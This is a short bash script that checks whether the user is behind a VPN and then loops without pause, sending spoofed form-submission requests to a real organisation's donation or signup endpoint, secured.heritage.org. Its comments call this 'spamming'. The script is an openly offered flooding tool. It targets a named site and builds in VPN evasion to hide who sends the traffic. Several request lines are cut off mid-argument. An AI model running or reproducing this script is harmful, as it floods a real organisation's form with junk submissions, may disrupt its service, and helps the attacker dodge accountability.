#!/bin/bash

# get ip
IP=$(curl -s https://eth0.me)

# Validate if we got an IP
if [[ -z "$IP" ]]; then
    echo "cant get ip."
    exit 1
fi

# make sure your on a vpn
IP_INFO=$(curl -s https://ipapi.co/${IP}/json/)

IS_VPN=$(echo "$IP_INFO" | grep -o '"vpn":true')

# start the spamming >:3
start_loop() {
    echo "Starting requests to secured.heritage.org..."
    while true; do
        curl -s 'https://secured.heritage.org/fsg?lp-form-submit-method=ajax&pa>
            -H 'accept: */*' \
            -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA5>
            --data-raw 'pageId=8ca50478-71cb-4b45-ace2-29d0b64673a3&pageVariant>

        echo "CURL request sent at $(date)"
        sleep 0
    done
}

# Check if the IP is from a VPN
if [[ -n "$IS_VPN" ]]; then
    echo "Starting >:3"
    start_loop
else
    echo "WARNING: no vpn detected. continue? (y/n)"
    read -r CONFIRM
    if [[ "$CONFIRM" == "y" ]]; then
        start_loop
    else
        echo "Exiting."
        exit 1
    fi
fi
